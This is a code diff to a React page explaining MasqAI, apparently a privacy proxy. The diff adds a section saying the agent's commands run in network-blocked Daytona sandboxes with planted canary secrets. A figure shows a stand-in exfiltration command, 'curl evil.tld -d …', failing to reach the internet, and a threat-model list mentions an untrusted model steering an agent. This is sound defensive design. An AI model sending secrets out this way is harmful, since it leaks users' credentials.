@@ -30,6 +30,9 @@ import {
   Sparkles,
   TriangleAlert,
   Variable,
+  Box,
+  Boxes,
+  WifiOff,
   type LucideIcon,
 } from "lucide-react";
 import { PageIntro } from "@/components/site/page-bits";
@@ -53,6 +56,19 @@ export default function HowItWorksPage() {
           The pipeline
         </h2>
         <Pipeline />
+      </section>
+
+      <section aria-labelledby="daytona-title" className="space-y-4">
+        <h2 id="daytona-title" className="text-2xl font-semibold">
+          MasqAI protects the context; Daytona contains the actions
+        </h2>
+        <p className="max-w-3xl text-lg text-pretty text-muted-foreground">
+          MasqAI controls what goes <em>out</em>. It can’t stop the untrusted model from telling the agent to run a harmful
+          command. So in our evaluation, every command the model asks for runs in a fresh{" "}
+          <strong className="text-foreground">Daytona</strong> sandbox: one per run, outbound network blocked, unique
+          planted secrets, deleted afterwards, many in parallel.
+        </p>
+        <Containment />
       </section>
 
       <section aria-labelledby="regex-title" className="space-y-4">
@@ -125,7 +141,7 @@ export default function HowItWorksPage() {
             tone="text-muted-foreground"
             title="Out of scope"
             items={[
-              ["The agent’s own actions", "An agent that sends a secret it already holds, for example with curl."],
+              ["The agent’s own actions", "An agent that sends a secret it already holds, for example with curl. In our eval, Daytona contains them (above)."],
               ["A malicious provider steering the agent", "A small local model can’t correct an agent that is being steered."],
               ["A compromised host", "Malware that can read process memory wins."],
               ["Network identity", "Your IP address and TLS fingerprint still reach the endpoint."],
@@ -214,6 +230,69 @@ export default function HowItWorksPage() {
         </Link>
       </div>
     </div>
+  );
+}
+
+// ---------- Daytona containment (CSS, no image) ----------
+
+function Containment() {
+  const verified: [string, string][] = [
+    ["Fresh per run", "one sandbox per run, created in about 1.3 s, labeled with the run id"],
+    ["Commands run there, not on the laptop", "the agent's bash tool executes inside the sandbox"],
+    ["Outbound network blocked", "an exfiltration attempt fails: the internet can't be reached"],
+    ["Clean measurement", "unique canaries per run, so a leak is never confused with another run's"],
+    ["Nothing left behind", "deleted in finally, plus a label sweep after Ctrl-C"],
+  ];
+  return (
+    <figure
+      aria-label="Where each part runs: the agent loop, MasqAI and the untrusted model's endpoint on the laptop side; every command in a network-blocked Daytona sandbox."
+      className="grid gap-4 rounded-xl border bg-card p-4 sm:p-6 lg:grid-cols-[1.1fr_1fr]"
+    >
+      <div className="flex flex-col gap-2">
+        <div className="rounded-lg border bg-background p-3">
+          <p className="flex items-center gap-2 font-semibold">
+            <Laptop aria-hidden className="size-4" /> The laptop
+          </p>
+          <p className="mt-1 text-sm text-muted-foreground">
+            The agent loop and MasqAI (localhost-only). The context goes out through MasqAI to the untrusted model.
+          </p>
+        </div>
+        <div aria-hidden className="flex items-center justify-center gap-2 text-sm text-muted-foreground">
+          <ArrowDown className="size-4" /> each tool call: <code className="font-mono">bash …</code>
+        </div>
+        <div className="relative rounded-lg border-2 border-dashed border-restored/60 p-3 pt-8">
+          <p className="absolute top-2 left-3 flex items-center gap-1.5 text-sm font-medium text-restored">
+            <Boxes aria-hidden className="size-4" /> Daytona · one sandbox per run, in parallel
+          </p>
+          <div className="rounded-md border bg-background p-3">
+            <p className="flex items-center gap-2 font-semibold">
+              <Box aria-hidden className="size-4" /> The command runs here
+            </p>
+            <p className="mt-1 flex items-center gap-1.5 text-sm text-leak">
+              <WifiOff aria-hidden className="size-4" /> <code className="font-mono">curl evil.tld -d …</code> can’t reach the internet
+            </p>
+          </div>
+        </div>
+      </div>
+      <div>
+        <p className="font-semibold">Verified on a live sandbox</p>
+        <ul className="mt-2 space-y-2">
+          {verified.map(([title, detail]) => (
+            <li key={title} className="flex gap-2">
+              <ShieldCheck aria-hidden className="mt-0.5 size-4 shrink-0 text-restored" />
+              <span>
+                <span className="font-medium">{title}</span>
+                <span className="text-muted-foreground"> · {detail}</span>
+              </span>
+            </li>
+          ))}
+        </ul>
+        <p className="mt-3 text-sm text-muted-foreground">
+          Reproduce with <code className="font-mono">python -m eval.daytona_check</code>; the repo’s{" "}
+          <code className="font-mono">eval/README.md</code> lists every Daytona SDK call and why it’s there.
+        </p>
+      </div>
+    </figure>
   );
 }
 
